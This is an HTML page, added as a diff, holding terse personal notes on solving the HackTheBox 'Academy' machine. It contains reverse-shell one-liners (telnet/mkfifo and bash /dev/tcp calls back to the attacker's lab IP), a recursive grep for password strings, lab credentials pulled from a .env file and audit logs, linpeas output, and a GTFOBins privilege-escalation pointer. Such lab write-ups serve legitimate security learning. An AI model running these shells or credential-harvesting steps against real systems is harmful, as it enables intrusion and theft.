@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Academy · Will Seligman</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="/index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="htb/machines/academy.html"></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="/htb/index.html">HackTheBox</a> &rsaquo; <a href="/htb/machines/index.html">Completed Machines</a></div>
+  <h1 id="academy">Academy</h1>
+<p><span class="img-missing">image unavailable</span><br />
+admin admin notworking<br />
+added to etc/hosts<br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+logged in with created account after changing role id to 1, admin pass<br />
+<span class="img-missing">image unavailable</span><br />
+added dev-staging-01.academy.htb to etc hosts<br />
+<span class="img-missing">image unavailable</span><br />
+admin@htb<br />
+<span class="img-missing">image unavailable</span><br />
+"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=”<br />
+<span class="img-missing">image unavailable</span><br />
+hmm not reading<br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<a href="http://dev-staging-01.academy.htb/">http://dev-staging-01.academy.htb</a><br />
+also set as rhost</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>bunch of users not finding where<br />
+<span class="img-missing">image unavailable</span><br />
+find /home -iname user.txt</p>
+<p>found the flag under another user<br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<code>TF=$(mktemp -u);mkfifo $TF &amp;&amp; telnet</code><strong><code>10.10.14.2</code></strong><code>8888 0&lt;$TF |</code><strong><code>sh</code></strong><code>1&gt;$TF</code><br />
+stty raw -echo<br />
+/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/9999 0&gt;&amp;1'<br />
+<code>grep -iRl passw ../</code></p>
+<p>finally got a better shell with this<br />
+/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/9999 0&gt;&amp;1'<br />
+<span class="img-missing">image unavailable</span><br />
+grep -iRl passw ../<br />
+../sbin/deluser<br />
+../sbin/pam-auth-update<br />
+../sbin/pwck<br />
+../sbin/grub-install<br />
+../sbin/pwconv<br />
+../sbin/newusers<br />
+../sbin/cryptsetup-reencrypt<br />
+../sbin/grub-macbless<br />
+../sbin/groupdel<br />
+../sbin/chgpasswd<br />
+../sbin/unix_update<br />
+../sbin/cpgr<br />
+../sbin/init<br />
+../sbin/iscsistart<br />
+../sbin/grpunconv<br />
+../sbin/useradd<br />
+../sbin/grub-probe<br />
+../sbin/sshd<br />
+../sbin/usermod<br />
+../sbin/shadowconfig<br />
+../sbin/mysqld<br />
+../sbin/userdel<br />
+../sbin/vipw<br />
+../sbin/groupadd<br />
+../sbin/ldconfig.real<br />
+../sbin/telinit<br />
+../sbin/applygnupgdefaults<br />
+../sbin/grub-bios-setup<br />
+../sbin/poweroff<br />
+../sbin/halt<br />
+../sbin/reboot<br />
+../sbin/pam_extrausers_update<br />
+../sbin/iw<br />
+../sbin/grpconv<br />
+../sbin/visudo<br />
+../sbin/runlevel<br />
+../sbin/dmidecode<br />
+../sbin/grpck<br />
+../sbin/addgnupghome<br />
+../sbin/delgroup<br />
+../sbin/iscsiadm<br />
+../sbin/plymouthd<br />
+../sbin/groupmod<br />
+../sbin/hdparm<br />
+../sbin/groupmems<br />
+../sbin/chpasswd<br />
+../sbin/addgroup<br />
+../sbin/ethtool<br />
+../sbin/update-passwd<br />
+../sbin/grub-mkconfig<br />
+../sbin/pam_extrausers_chkpwd<br />
+../sbin/logrotate<br />
+../sbin/shutdown<br />
+../sbin/tcpdump<br />
+../sbin/iscsid<br />
+../sbin/cppw<br />
+../sbin/vigr<br />
+../sbin/pwunconv<br />
+../sbin/sulogin<br />
+../sbin/adduser<br />
+../sbin/apache2<br />
+../sbin/cron<br />
+../sbin/cryptsetup<br />
+../sbin/unix_chkpwd<br />
+../etc/login.defs<br />
+../etc/services<br />
+../etc/rc2.d/S01mysql<br />
+../etc/fwupd/remotes.d/lvfs-testing.conf<br />
+../etc/fwupd/redfish.conf<br />
+../etc/default/nss<br />
+../etc/default/useradd<br />
+../etc/debconf.conf<br />
+../etc/alternatives/rview<br />
+../etc/alternatives/from<br />
+../etc/alternatives/nc<br />
+../etc/alternatives/view<br />
+../etc/alternatives/nawk<br />
+../etc/alternatives/vimdiff<br />
+../etc/alternatives/awk<br />
+../etc/alternatives/vi<br />
+../etc/alternatives/pinentry<br />
+../etc/alternatives/rsh<br />
+../etc/alternatives/pftp<br />
+../etc/alternatives/php<br />
+../etc/alternatives/ex<br />
+../etc/alternatives/netcat<br />
+../etc/alternatives/ftp<br />
+../etc/alternatives/vim<br />
+../etc/alternatives/rlogin<br />
+../etc/alternatives/rvim<br />
+../etc/pam.d/su-l<br />
+../etc/pam.d/newusers<br />
+../etc/pam.d/common-password<br />
+../etc/pam.d/passwd<br />
+../etc/pam.d/sshd<br />
+../etc/pam.d/chsh<br />
+../etc/pam.d/other<br />
+../etc/pam.d/login<br />
+../etc/pam.d/chfn<br />
+../etc/pam.d/polkit-1<br />
+../etc/pam.d/chpasswd<br />
+../etc/pam.d/su<br />
+../etc/pam.d/common-session<br />
+../etc/sos/sos.conf<br />
+../etc/logcheck/ignore.d.server/mysql-server-8_0<br />
+../etc/logcheck/ignore.d.workstation/mysql-server-8_0<br />
+../etc/rc4.d/S01mysql<br />
+../etc/vmware-tools/vm-support<br />
+../etc/rpc<br />
+../etc/ssl/openssl.cnf<br />
+../etc/bindresvport.blacklist<br />
+../etc/overlayroot.conf<br />
+../etc/rc3.d/S01mysql<br />
+../etc/adduser.conf<br />
+../etc/apparmor.d/usr.lib.snapd.snap-confine.real<br />
+../etc/apparmor.d/abstractions/nameservice<br />
+../etc/apparmor.d/abstractions/authentication<br />
+../etc/apparmor.d/abstractions/ubuntu-browsers.d/java<br />
+../etc/rc0.d/K01mysql<br />
+../etc/hdparm.conf<br />
+../etc/rc6.d/K01mysql<br />
+../etc/ssh/ssh_config<br />
+../etc/ssh/sshd_config<br />
+../etc/nsswitch.conf<br />
+../etc/php/7.4/cli/php.ini<br />
+../etc/php/7.4/apache2/php.ini<br />
+../etc/rc5.d/S01mysql<br />
+../etc/mysql/my.cnf.fallback<br />
+../etc/rc1.d/K01mysql<br />
+../etc/init.d/mysql<br />
+../etc/security/namespace.init<br />
+../etc/apache2/sites-available/default-ssl.conf<br />
+../etc/apache2/apache2.conf</p>
+<p>cat /etc/apache2/apache2.conf<br />
+cat /etc/init.d/mysql<br />
+cat /etc/apache2/sites-available/default-ssl.conf<br />
+cat ../etc/apache2/apache2.conf</p>
+<p><span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/8888 0&gt;&amp;1'<br />
+<a href="https://www.exploit-db.com/exploits/50512">https://www.exploit-db.com/exploits/50512</a><br />
+<span class="img-missing">image unavailable</span><br />
+we i got here</p>
+<p><span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+idky this didnt run the first time<br />
+<span class="img-missing">image unavailable</span><br />
+../.env<br />
+../.env.example<br />
+../bootstrap/cache/services.php<br />
+../resources/lang/en/passwords.php<br />
+../database/migrations/2014_10_12_100000_create_password_resets_table.php<br />
+../database/migrations/2014_10_12_000000_create_users_table.php<br />
+../database/factories/UserFactory.php<br />
+../config/cache.php<br />
+../config/mail.php<br />
+../config/database.php<br />
+../config/auth.php<br />
+../config/hashing.php<br />
+../config/app.php<br />
+<span class="img-missing">image unavailable</span><br />
+'\$2y\$10\$TKh8H1.PfQx37YgCzwiKb.KjNyWgaHb9cbcoQgdIVFlYg7B77UdFm’<br />
+\$faker<br />
+cry0l1t3<br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+cry0l1t3<br />
+mySup3rP4s5w0rd!!</p>
+<p><span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+got linpeas running<br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span></p>
+<p>🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨<br />
+<span class="img-missing">image unavailable</span><br />
+[+] Checking for TTY (sudo/su) passwords in audit logs<br />
+1. 08/12/20 02:28:10 83 0 ? 1 sh "su mrb3n",\&lt;nl&gt;<br />
+2. 08/12/20 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",\&lt;nl&gt;<br />
+/var/log/audit/audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A<br />
+/var/log/auth.log.1:Feb  9 14:22:44 academy sudo:     root : TTY=tty1 ; PWD=/tmp/tmp.oJH3D2iQM2 ; USER=mrb3n ; COMMAND=/usr/bin/sudo -K<br />
+/var/log/auth.log.1:Feb  9 14:23:27 academy sudo:     root : TTY=tty1 ; PWD=/tmp/tmp.oJH3D2iQM2 ; USER=root ; COMMAND=sudoedit /<br />
+<span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span><br />
+/var/www/html/academy/database/factories/UserFactory.php:\$2y\$10\$TKh8H1.PfQx37YgCzwiKb.KjNyWgaHb9cbcoQgdIVFlYg7B77UdFm<br />
+/var/www/html/htb-academy-dev-01/database/factories/UserFactory.php:\$2y\$10\$TKh8H1.PfQx37YgCzwiKb.KjNyWgaHb9cbcoQgdIVFlYg7B77UdFm<br />
+<span class="img-missing">image unavailable</span><br />
+mrb3n<br />
+mrb3n_Ac@d3my!</p>
+<p><span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span></p>
+<p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a><br />
+composer gtfo bin<br />
+copy pasta command &amp;&amp; link<br />
+<span class="img-missing">image unavailable</span><br />
+522133fcb02e225be276127788fd46c8</p>
+  </article>
+  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+</main>
+</div>
+<script src="/assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
